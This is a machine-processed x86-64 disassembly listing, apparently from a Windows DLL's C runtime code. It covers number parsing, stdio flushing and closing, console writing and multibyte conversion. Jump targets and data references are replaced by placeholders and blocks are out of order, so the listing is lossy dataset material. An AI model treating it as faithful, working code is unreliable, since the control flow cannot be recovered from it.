mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
test ecx ecx
je r-xdata
sub r8d esi
mov [ rbp + r13 * 4 - 0x30 ] edx
movsxd rdx r8d
js r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
cmp r8 r10
jl r-xdata
mov r8d ebx
mov ebx edi
jmp r-xdata
sub r8 rsi
jns r-xdata
mov eax [ rbp + rdx * 4 - 0x30 ]
mov ecx ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov ecx esi
cmp r8d esi
jae r-xdata
mov [ rbp + rdx * 4 - 0x30 ] r8d
sub rdx rsi
jns r-xdata
sub_180028540
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x7 ]
sub rsp 0xa0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x1 ] rax
mov r13 [ rbp + 0x7f ]
xor ebx ebx
mov [ rbp - 0x71 ] r9d
lea r9d [ rbx + 0x1 ]
mov [ rbp - 0x59 ] rcx
mov [ rbp - 0x69 ] rdx
lea r10 [ rbp - 0x21 ]
mov [ rbp - 0x6d ] bx
mov edi ebx
mov [ rbp - 0x75 ] r9d
mov r14d ebx
mov [ rbp - 0x79 ] ebx
mov r15d ebx
mov esi ebx
mov r12d ebx
mov ecx ebx
test r13 r13
jne r-xdata
mov r11 r8
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
xor eax eax
jmp r-xdata
add r8 r9
jmp r-xdata
cmp al 0x9
je r-xdata
mov rcx [ rbp - 0x1 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0xf0 ]
add rsp 0xa0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov al [ r8 ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov dl [ r8 ]
add r8 r9
cmp ecx 0x5
jg r-xdata
mov r9d ecx
sub r9d 0x6
je r-xdata
je r-xdata
lea eax [ rdx - 0x31 ]
lea r11 [ r8 - 0x2 ]
cmp al 0x8
jbe r-xdata
dec r9d
je r-xdata
sub dl 0x30
mov [ rbp - 0x79 ] r9d
cmp dl 0x9
ja r-xdata
mov r9d ecx
test ecx ecx
je r-xdata
mov ecx 0x9
jmp r-xdata
cmp dl 0x2b
je r-xdata
lea eax [ rdx - 0x31 ]
cmp al 0x8
ja r-xdata
dec r9d
je r-xdata
mov r8 r11
jmp r-xdata
mov ecx 0x4
jmp r-xdata
lea eax [ rdx - 0x31 ]
cmp al 0x8
jbe r-xdata
dec r9d
je r-xdata
mov r9d 0x1
mov ecx 0x7
cmp dl 0x2d
je r-xdata
cmp dl 0x30
jne r-xdata
mov r9d 0x1
mov r15d r9d
jmp r-xdata
dec r9d
je r-xdata
mov rax [ rbp - 0x69 ]
mov [ rax ] r8
test r14d r14d
je r-xdata
sub r8 r9
jmp r-xdata
mov ecx 0x3
mov rax [ r13 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
je r-xdata
lea eax [ rdx - 0x31 ]
mov r9d 0x1
mov r14d r9d
cmp al 0x8
ja r-xdata
dec r9d
je r-xdata
mov r9d 0x1
jmp r-xdata
or [ rbp - 0x75 ] 0xffffffff
mov ecx 0x7
jmp r-xdata
jmp r-xdata
mov r8 r11
mov ecx 0x8
jmp r-xdata
cmp dl 0x30
je r-xdata
mov r9d 0x1
mov r11b 0x30
mov r15d r9d
jmp r-xdata
cmp r9d 0x2
jne r-xdata
movzx edx bx
movzx eax bx
mov edi ebx
mov ecx ebx
mov ebx 0x4
cmp edi 0x18
jbe r-xdata
mov ecx 0x5
cmp dl 0x2b
je r-xdata
mov rax [ r13 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
je r-xdata
lea ecx [ r9 + 0x2 ]
jmp r-xdata
lea eax [ rdx - 0x31 ]
cmp al 0x8
ja r-xdata
dec r9d
je r-xdata
mov r9d 0x1
jmp r-xdata
mov dl [ r8 ]
add r8 r9
sub dl 0x31
cmp dl 0x8
ja r-xdata
cmp dl r11b
jge r-xdata
cmp ecx 0xa
je r-xdata
cmp [ rbp + 0x77 ] ebx
je r-xdata
test edi edi
jne r-xdata
mov al [ rbp - 0xa ]
cmp al 0x5
jl r-xdata
mov ecx 0x2
mov [ rbp - 0x6d ] bx
jmp r-xdata
cmp dl 0x2d
je r-xdata
mov ecx 0x4
jmp r-xdata
cmp dl 0x2b
je r-xdata
mov rax [ r13 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
jne r-xdata
mov r9d 0x1
mov al 0x30
mov r14d r9d
jmp r-xdata
dec r9d
jne r-xdata
sub r8 r9
jmp r-xdata
mov ecx 0x9
jmp r-xdata
cmp dl 0x39
jg r-xdata
jmp r-xdata
mov r9d 0x1
lea r11 [ r8 - 0x1 ]
cmp dl 0x2b
je r-xdata
sub r10 r9
cmp [ r10 ] bl
je r-xdata
movzx edx bx
movzx eax bx
mov edi ebx
mov ecx ebx
jmp r-xdata
sub r10 r9
mov edi 0x18
add r12d r9d
add al r9b
mov [ rbp - 0xa ] al
mov ecx 0x2
mov [ rbp - 0x6d ] 0x8000
jmp r-xdata
cmp dl 0x30
je r-xdata
sub r8 r9
mov ecx 0xb
jmp r-xdata
cmp dl 0x2d
je r-xdata
cmp dl 0x30
jne r-xdata
cmp dl al
jge r-xdata
mov r9d 0x1
mov r14d r9d
mov [ rbp - 0x79 ] r9d
test edi edi
jne r-xdata
cmp dl r11b
jge r-xdata
lea ecx [ rsi + rsi * 4 ]
movsx eax dl
lea esi [ rax + rcx * 2 - 0x30 ]
cmp esi 0x1450
jg r-xdata
mov ecx 0x7
jmp r-xdata
cmp dl 0x2d
jne r-xdata
dec edi
add r12d r9d
lea r8 [ rbp - 0x41 ]
lea rcx [ rbp - 0x21 ]
mov edx edi
call sub_18002a124
cmp [ rbp - 0x75 ] ebx
jge r-xdata
mov r8 [ rbp - 0x59 ]
or ax [ rbp - 0x6d ]
mov [ r8 + 0xa ] ax
mov eax ebx
mov [ r8 ] dx
mov [ r8 + 0x2 ] ecx
mov [ r8 + 0x6 ] edi
mov r9d 0x1
cmp dl 0x30
je r-xdata
cmp dl 0x39
jg r-xdata
mov rax [ r13 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
jne r-xdata
cmp dl 0x30
jge r-xdata
jmp r-xdata
cmp dl 0x39
jg r-xdata
jmp r-xdata
mov esi 0x1451
jmp r-xdata
mov dl [ r8 ]
add r8 r9
add esi r12d
test r15d r15d
jne r-xdata
neg esi
mov ecx r9d
jmp r-xdata
jmp r-xdata
cmp edi 0x19
jae r-xdata
cmp dl 0x2b
je r-xdata
cmp dl 0x39
jg r-xdata
cmp dl 0x30
je r-xdata
mov dl [ r8 ]
add r8 r9
cmp [ rbp - 0x79 ] ebx
jne r-xdata
add esi [ rbp + 0x67 ]
cmp dl 0x43
jle r-xdata
add r12d r9d
sub dl al
add edi r9d
mov [ r10 ] dl
add r10 r9
jmp r-xdata
cmp dl 0x2d
je r-xdata
cmp edi 0x19
jae r-xdata
mov dl [ r8 ]
sub r12d r9d
add r8 r9
jmp r-xdata
cmp esi 0x1450
jg r-xdata
sub esi [ rbp + 0x6f ]
cmp dl 0x45
jle r-xdata
mov dl [ r8 ]
add r8 r9
mov dl [ r8 ]
add r8 r9
sub dl 0x30
add edi r9d
mov [ r10 ] dl
add r10 r9
sub r12d r9d
mov ecx ebx
movzx edx bx
mov eax 0x7fff
mov ebx 0x2
mov edi 0x80000000
jmp r-xdata
cmp esi 0xffffebb0
jl r-xdata
mov ecx 0x6
jmp r-xdata
sub dl 0x64
cmp dl r9b
ja r-xdata
mov edx ebx
movzx eax bx
mov edi ebx
mov ecx ebx
mov ebx 0x1
jmp r-xdata
lea r13 [ rw-data ]
sub r13 0x60
test esi esi
je r-xdata
mov eax [ rbp - 0x39 ]
movzx edx [ rbp - 0x41 ]
mov ecx [ rbp - 0x3f ]
mov edi [ rbp - 0x3b ]
shr eax 0x10
jmp r-xdata
jns r-xdata
cmp [ rbp - 0x71 ] ebx
jne r-xdata
lea r13 [ rw-data ]
neg esi
sub r13 0x60
test esi esi
je r-xdata
mov [ rbp - 0x41 ] bx
mov edi 0x80000000
mov r10d 0x7fff
mov r12d 0x1
test esi esi
jne r-xdata
cdqe
mov r15d 0x8000
lea rcx [ rax + rax * 2 ]
lea rdx [ r13 + rcx * 4 ]
cmp [ rdx ] r15w
jb r-xdata
mov eax esi
add r13 0x54
sar esi 0x3
and eax 0x7
mov [ rbp - 0x71 ] esi
mov [ rbp - 0x61 ] r13
je r-xdata
movzx eax [ rdx + 0xa ]
movzx ecx [ rbp - 0x37 ]
mov [ rbp - 0x51 ] rbx
movzx r9d ax
and ax r10w
mov [ rbp - 0x49 ] ebx
xor r9w cx
and cx r10w
and r9w r15w
lea r8d [ rcx + rax ]
mov [ rbp - 0x75 ] r9w
cmp cx r10w
jae r-xdata
mov rcx [ rdx ]
mov eax [ rdx + 0x8 ]
lea rdx [ rbp - 0x31 ]
mov [ rbp - 0x31 ] rcx
shr rcx 0x10
mov [ rbp - 0x29 ] eax
sub ecx r12d
mov [ rbp - 0x2f ] ecx
neg r9w
cmp ax r10w
jae r-xdata
mov r11d 0xbffd
cmp r8w r11w
ja r-xdata
mov r9d 0x3fbf
cmp r8w r9w
ja r-xdata
test cx cx
jne r-xdata
mov [ rbp - 0x3d ] rbx
mov [ rbp - 0x41 ] ebx
jmp r-xdata
test ax ax
jne r-xdata
add r8w r12w
test [ rbp - 0x39 ] 0x7fffffff
jne r-xdata
mov r10d 0x5
mov r12d ebx
lea rcx [ rbp - 0x51 ]
lea r13d [ r10 - 0x4 ]
add r8w r12w
test [ rdx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ rbp - 0x3d ] ebx
jne r-xdata
sub r10d r13d
add rcx 0x2
add r12d r13d
test r10d r10d
jg r-xdata
mov edi r12d
lea r14 [ rbp + r9 - 0x41 ]
lea r15 [ rdx + 0x8 ]
and edi r13d
cmp [ rdx + 0x4 ] ebx
jne r-xdata
cmp [ rbp - 0x41 ] ebx
jne r-xdata
lea eax [ r12 + r12 ]
mov [ rbp - 0x79 ] r10d
movsxd r9 eax
test r10d r10d
jle r-xdata
mov r10d [ rbp - 0x49 ]
mov r9d [ rbp - 0x51 ]
mov eax 0xc002
add r8w ax
mov edi 0x80000000
mov r14d 0xffff
test r8w r8w
jle r-xdata
mov r11d r13d
cmp esi r9d
jae r-xdata
cmp [ rdx ] ebx
je r-xdata
mov [ rbp - 0x37 ] bx
jmp r-xdata
add r8w r14w
jns r-xdata
test edi r10d
jne r-xdata
mov r11d [ rbp - 0x79 ]
add r14 0x2
sub r15 0x2
sub r11d r13d
mov [ rbp - 0x79 ] r11d
test r11d r11d
jg r-xdata
add [ rcx + 0x4 ] r13w
mov [ rcx ] esi
test r11d r11d
je r-xdata
movzx eax [ rbp - 0x51 ]
movzx eax r8w
mov edi ebx
neg ax
movzx edx ax
add r8w dx
test r8w r8w
jg r-xdata
mov r11d [ rbp - 0x4d ]
mov edx r9d
add r10d r10d
shr edx 0x1f
add r9d r9d
mov ecx r11d
shr ecx 0x1f
lea eax [ r11 + r11 ]
add r8w r14w
or eax edx
or r10d ecx
mov [ rbp - 0x51 ] r9d
mov [ rbp - 0x4d ] eax
mov [ rbp - 0x49 ] r10d
test r8w r8w
jg r-xdata
movzx eax [ r14 ]
movzx r9d [ r15 ]
mov r11d ebx
imul r9d eax
mov eax [ rcx ]
lea esi [ rax + r9 ]
cmp esi eax
jb r-xdata
mov eax [ rbp - 0x4f ]
or ecx 0xffffffff
mov r12d 0x1
cmp eax ecx
jne r-xdata
and r9d 0x1ffff
cmp r9d 0x18000
jne r-xdata
mov r11d [ rbp - 0x4d ]
mov eax r10d
shr r9d 0x1
mov ecx r11d
shl eax 0x1f
shr r11d 0x1
shl ecx 0x1f
or r11d eax
shr r10d 0x1
or r9d ecx
sub rdx r13
mov [ rbp - 0x4d ] r11d
mov [ rbp - 0x51 ] r9d
jne r-xdata
add edi r13d
add eax r12d
mov [ rbp - 0x4f ] eax
jmp r-xdata
mov eax [ rbp - 0x4b ]
mov [ rbp - 0x4f ] ebx
cmp eax ecx
jne r-xdata
mov r12d 0x1
test [ rbp - 0x51 ] r13b
je r-xdata
test edi edi
mov [ rbp - 0x49 ] r10d
mov edi 0x80000000
je r-xdata
mov esi [ rbp - 0x71 ]
mov eax 0x7fff
cmp r8w ax
jb r-xdata
add eax r12d
mov [ rbp - 0x4b ] eax
movzx eax [ rbp - 0x47 ]
mov [ rbp - 0x4b ] ebx
cmp ax r14w
jne r-xdata
movzx eax [ rbp - 0x4f ]
or r8w [ rbp - 0x75 ]
mov [ rbp - 0x3b ] r10d
mov [ rbp - 0x41 ] ax
mov eax [ rbp - 0x4d ]
mov [ rbp - 0x37 ] r8w
mov [ rbp - 0x3f ] eax
mov r10d 0x7fff
jmp r-xdata
movzx eax [ rbp - 0x75 ]
mov r10d 0x7fff
neg ax
jmp r-xdata
movzx eax r9w
or ax r13w
mov [ rbp - 0x51 ] ax
mov r9d [ rbp - 0x51 ]
jmp r-xdata
add ax r12w
mov [ rbp - 0x47 ] ax
jmp r-xdata
mov [ rbp - 0x47 ] r15w
add r8w r12w
jmp r-xdata
sbb eax eax
mov [ rbp - 0x41 ] rbx
and eax edi
add eax 0x7fff8000
mov [ rbp - 0x39 ] eax
mov r13 [ rbp - 0x61 ]
mov r15d 0x8000
cmp ax r15w
ja r-xdata
mov r10d [ rbp - 0x49 ]
jmp r-xdata
sub_180028da4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rdi
sub rsp 0x20
test ecx ecx
js r-xdata
call sub_1800194ec
mov [ rax ] 0x9
call sub_18001950c
and [ rax ] 0x0
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
movsxd rbx ecx
lea rbp [ rw-data ]
mov rdi rbx
and ebx 0x1f
sar rdi 0x5
imul rbx rbx 0x58
mov rax [ rbp + rdi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
cmp [ rax + rbx ] 0xffffffffffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov rax [ rbp + rdi * 8 ]
or [ rbx + rax ] 0xffffffffffffffff
xor eax eax
jmp r-xdata
test ecx ecx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov ecx 0xfffffff6
dec ecx
je r-xdata
mov ecx 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
xor edx edx
call [ SetStdHandle@IAT ]
mov ecx 0xfffffff4
jmp r-xdata
sub_180028e50
sub rsp 0x28
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_18001950c
and [ rax ] 0x0
call sub_1800194ec
mov [ rax ] 0x9
jmp r-xdata
call sub_18001950c
and [ rax ] 0x0
call sub_1800194ec
mov [ rax ] 0x9
call sub_18001dab4
cmp ecx [ rw-data ]
jae r-xdata
or rax 0xffffffffffffffff
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
test [ rax + rdx + 0x8 ] 0x1
je r-xdata
mov rax [ rax + rdx ]
jmp r-xdata
add rsp 0x28
retn
sub_180028ec4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r14
sub rsp 0x20
movsxd rbx ecx
mov r12 rbx
sar r12 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rsi [ r14 + r12 * 8 ]
mov edi 0x1
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
test edi edi
je r-xdata
lea ecx [ rdi + 0x9 ]
call sub_180022e38
nop
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
mov eax edi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
mov r12 [ rsp + 0x48 ]
add rsp 0x20
pop r14
retn
mov rcx [ r14 + r12 * 8 ]
lea rcx [ rcx + rbx + 0x10 ]
call [ EnterCriticalSection@IAT ]
mov ecx 0xa
call sub_180022d38
lea rcx [ rbx + rsi + 0x10 ]
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
neg eax
sbb edx edx
and edi edx
inc [ rbx + rsi + 0xc ]
sub_180028f94
mov [ rsp + 0x8 ] cx
sub rsp 0x38
mov rcx [ rw-data ]
cmp rcx 0xfffffffffffffffe
jne r-xdata
cmp rcx 0xffffffffffffffff
jne r-xdata
call sub_18002a34c
mov rcx [ rw-data ]
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x48 ]
lea rdx [ rsp + 0x40 ]
mov r8d 0x1
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax [ rsp + 0x40 ]
add rsp 0x38
retn
sub_180028ff0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x50
xor r12d r12d
mov rsi r8
mov rdi rdx
mov rbx rcx
test rdx rdx
je r-xdata
xor eax eax
test r8 r8
je r-xdata
cmp [ rdx ] r12b
jne r-xdata
lea rcx [ rbp - 0x20 ]
mov rdx r9
call sub_180018cdc
mov r11 [ rbp - 0x20 ]
cmp [ r11 + 0x14 ] r12d
jne r-xdata
test rcx rcx
je r-xdata
movzx ecx [ rdi ]
lea rdx [ rbp - 0x20 ]
call sub_180024c7c
test eax eax
je r-xdata
test rbx rbx
je r-xdata
mov [ rcx ] r12w
mov eax r12d
mov r9d 0x1
test rbx rbx
setne al
lea edx [ r9 + 0x8 ]
mov r8 rdi
mov [ rsp + 0x28 ] eax
mov rax [ rbp - 0x20 ]
mov [ rsp + 0x20 ] rbx
mov ecx [ rax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov rcx [ rbp - 0x20 ]
mov r9d [ rcx + 0x10c ]
cmp r9d 0x1
jle r-xdata
cmp [ rbp - 0x8 ] r12b
je r-xdata
movzx eax [ rdi ]
mov [ rbx ] ax
jmp r-xdata
movsxd rax [ rcx + 0x10c ]
cmp rsi rax
jb r-xdata
cmp esi r9d
jl r-xdata
mov eax 0x1
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_1800194ec
mov [ rax ] 0x2a
cmp [ rbp - 0x8 ] r12b
je r-xdata
cmp [ rdi + 0x1 ] r12b
je r-xdata
mov ecx [ rcx + 0x4 ]
mov eax r12d
test rbx rbx
setne al
mov r8 rdi
mov edx 0x9
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
mov rcx [ rbp - 0x20 ]
test eax eax
jne r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rdi [ rsp + 0x70 ]
mov r12 [ rsp + 0x78 ]
add rsp 0x50
pop rbp
retn
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov eax [ rcx + 0x10c ]
cmp [ rbp - 0x8 ] r12b
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_180029170
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
xor edi edi
lea ecx [ rdi + 0x1 ]
call sub_180022e38
nop
lea ebx [ rdi + 0x3 ]
mov ecx 0x1
call sub_180022d38
mov eax edi
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
movsxd rsi ebx
mov rax [ rw-data ]
cmp [ rax + rsi * 8 ] 0x0
je r-xdata
inc ebx
jmp r-xdata
mov rcx [ rax + rsi * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
mov [ rsp + 0x20 ] ebx
cmp ebx [ rw-data ]
jge r-xdata
cmp ebx 0x14
jl r-xdata
call sub_18002a428
cmp eax 0xffffffff
je r-xdata
mov rax [ rw-data ]
mov rcx [ rax + rsi * 8 ]
add rcx 0x30
call [ DeleteCriticalSection@IAT ]
mov rcx [ rw-data ]
mov rcx [ rcx + rsi * 8 ]
call sub_180018b3c
mov r11 [ rw-data ]
and [ r11 + rsi * 8 ] 0x0
inc edi
mov [ rsp + 0x24 ] edi
sub_18002921c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov eax [ rcx + 0x18 ]
xor esi esi
mov rbx rcx
and al 0x3
cmp al 0x2
jne r-xdata
mov rcx [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov eax esi
mov rsi [ rsp + 0x38 ]
mov [ rbx ] rcx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test [ rcx + 0x18 ] 0x108
je r-xdata
mov edi [ rcx ]
sub edi [ rcx + 0x10 ]
test edi edi
jle r-xdata
call sub_180025cc4
mov rdx [ rbx + 0x10 ]
mov r8d edi
mov ecx eax
call sub_18002591c
cmp eax edi
jne r-xdata
or [ rbx + 0x18 ] 0x20
or esi 0xffffffff
mov eax [ rbx + 0x18 ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ rbx + 0x18 ] eax
jmp r-xdata
sub_180029298
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
jne r-xdata
call sub_18002921c
test eax eax
je r-xdata
add rsp 0x20
pop rbx
jmp sub_1800292e4
test [ rbx + 0x18 ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov rcx rbx
call sub_180025cc4
mov ecx eax
call sub_18002a490
neg eax
sbb eax eax
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_1800292e4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r15
sub rsp 0x30
mov r13d ecx
xor esi esi
xor edi edi
lea ecx [ rsi + 0x1 ]
call sub_180022e38
nop
xor ebx ebx
or r15d 0xffffffff
mov ecx 0x1
call sub_180022d38
cmp r13d 0x1
cmove edi esi
mov eax edi
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x30
pop r15
pop r13
pop r12
retn
movsxd r12 ebx
mov rax [ rw-data ]
cmp [ rax + r12 * 8 ] 0x0
je r-xdata
inc ebx
jmp r-xdata
mov rdx [ rax + r12 * 8 ]
test [ rdx + 0x18 ] 0x83
je r-xdata
mov [ rsp + 0x20 ] ebx
cmp ebx [ rw-data ]
jge r-xdata
mov ecx ebx
call sub_180025c24
nop
mov rax [ rw-data ]
mov rcx [ rax + r12 * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
mov rdx [ rw-data ]
mov rdx [ rdx + r12 * 8 ]
mov ecx ebx
call sub_180025ca4
cmp r13d 0x1
jne r-xdata
test r13d r13d
jne r-xdata
call sub_180029298
cmp eax r15d
je r-xdata
test [ rcx + 0x18 ] 0x2
je r-xdata
inc esi
mov [ rsp + 0x24 ] esi
jmp r-xdata
call sub_180029298
cmp eax r15d
cmove edi r15d
mov [ rsp + 0x28 ] edi
sub_1800293dc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push rbp
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x40
mov r15 rdx
mov rdx rcx
lea rcx [ rbp - 0x20 ]
mov r13d r9d
mov r14 r8
call sub_180018cdc
test r14 r14
je r-xdata
test r15 r15
jne r-xdata
mov [ r14 ] r15
test r13d r13d
je r-xdata
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
cmp [ rbp - 0x8 ] 0x0
jmp r-xdata
mov r12b [ r15 ]
mov r8 [ rbp - 0x20 ]
xor edi edi
lea rbx [ r15 + 0x1 ]
cmp r13d 0x2
jl r-xdata
je r-xdata
mov rax [ r8 + 0x140 ]
movzx ecx r12b
movzx eax [ rax + rcx * 2 ]
and eax 0x8
lea r8 [ rbp - 0x20 ]
movzx ecx r12b
mov edx 0x8
call sub_180023d70
mov r8 [ rbp - 0x20 ]
jmp r-xdata
cmp r13d 0x24
jg r-xdata
xor eax eax
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov esi [ rbp + 0x50 ]
cmp r12b 0x2d
jne r-xdata
mov r12b [ rbx ]
inc rbx
jmp r-xdata
test eax eax
je r-xdata
cmp r12b 0x2b
jne r-xdata
or esi 0x2
jmp r-xdata
cmp [ r8 + 0x10c ] 0x1
jle r-xdata
test r13d r13d
js r-xdata
mov r12b [ rbx ]
inc rbx
test r14 r14
je r-xdata
cmp r13d 0x1
je r-xdata
cmp [ rbp - 0x8 ] dil
mov [ r14 ] r15
cmp r13d 0x24
jg r-xdata
test r13d r13d
jne r-xdata
cmp r13d 0x10
jne r-xdata
cmp r12b 0x30
je r-xdata
mov r10 [ r8 + 0x140 ]
xor edx edx
or eax 0xffffffff
div r13d
mov r9d eax
cmp r12b 0x30
jne r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r13d 0xa
jmp r-xdata
and r8d 0x103
je r-xdata
movsx ecx r12b
sub ecx 0x30
jmp r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r13d 0x10
jmp r-xdata
cmp [ rbx ] 0x58
je r-xdata
dec rbx
test sil 0x8
jne r-xdata
lea eax [ r12 - 0x61 ]
movsx ecx r12b
cmp al 0x19
ja r-xdata
cmp ecx r13d
jae r-xdata
mov r12b [ rbx + 0x1 ]
add rbx 0x2
cmp [ rbx ] 0x58
jne r-xdata
mov r13d 0x8
jmp r-xdata
mov r12d 0x7fffffff
test sil 0x4
jne r-xdata
test r14 r14
cmovne rbx r15
xor edi edi
jmp r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or esi 0x8
cmp edi r9d
jb r-xdata
call sub_1800194ec
mov [ rax ] 0x22
test sil 0x1
je r-xdata
test sil 0x1
jne r-xdata
test r14 r14
je r-xdata
imul edi r13d
add edi ecx
jne r-xdata
mov al sil
and al 0x2
neg al
sbb edi edi
neg edi
add edi r12d
or edi 0xffffffff
jmp r-xdata
mov eax esi
and eax 0x2
je r-xdata
test sil 0x2
je r-xdata
mov [ r14 ] rbx
movzx ecx r12b
movzx r8d [ r10 + rcx * 2 ]
mov ecx r8d
and ecx 0x4
je r-xdata
or esi 0x4
test r14 r14
jne r-xdata
cmp ecx edx
jbe r-xdata
test eax eax
jne r-xdata
cmp edi 0x80000000
ja r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
neg edi
mov r12b [ rbx ]
inc rbx
jmp r-xdata
cmp edi r12d
jbe r-xdata
mov eax edi
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
sub_180029648
sub rsp 0x38
xor eax eax
mov r9d r8d
mov r8 rdx
cmp [ rw-data ] eax
mov [ rsp + 0x20 ] eax
mov rdx rcx
jne r-xdata
xor ecx ecx
lea rcx [ rw-data ]
jmp r-xdata
call sub_1800293dc
add rsp 0x38
retn
sub_180029678
mov [ rsp + 0x10 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x27 ]
sub rsp 0xc0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x17 ] rax
movzx edi [ rcx + 0x8 ]
mov r10d [ rcx ]
mov rbx r9
mov r9d [ rcx + 0x4 ]
movzx ecx di
mov r11d 0x1
mov [ rbp - 0x4d ] edx
mov edx 0x8000
xor r13d r13d
and cx dx
lea r15d [ rdx - 0x1 ]
mov [ rbp - 0x39 ] r8d
and di r15w
mov [ rbp - 0x41 ] rbx
mov [ rbp - 0x9 ] 0xcccccccc
mov [ rbp - 0x5 ] 0xcccccccc
mov [ rbp - 0x1 ] 0x3ffbcccc
mov [ rbp - 0x67 ] cx
lea eax [ r11 + 0x1f ]
lea r8d [ r11 + 0x2c ]
test cx cx
je r-xdata
mov [ rbx + 0x2 ] al
mov [ rbx + 0x2 ] r8b
jmp r-xdata
cmp di r15w
jne r-xdata
test r9d r9d
jne r-xdata
test di di
jne r-xdata
movzx r8d di
mov ecx r9d
mov [ rbp - 0x13 ] r9d
shr ecx 0x18
mov eax r8d
mov [ rbp - 0x17 ] r10d
shr eax 0x8
lea r9 [ rw-data ]
mov esi 0x80000000
imul r8d r8d 0x4d10
lea edx [ rax + rcx * 2 ]
mov r12d 0x5
sub r9 0x60
mov [ rbp - 0xf ] di
mov [ rbp - 0x19 ] r13w
mov r14d 0xbffd
imul edx edx 0x4d
lea ecx [ rdx + r8 - 0x134312f4 ]
mov [ rbp - 0x49 ] r12d
lea edi [ rsi - 0x1 ]
sar ecx 0x10
movsx r10d cx
mov [ rbp - 0x61 ] ecx
neg r10d
je r-xdata
mov esi 0x80000000
mov [ rbx ] r11w
cmp r9d esi
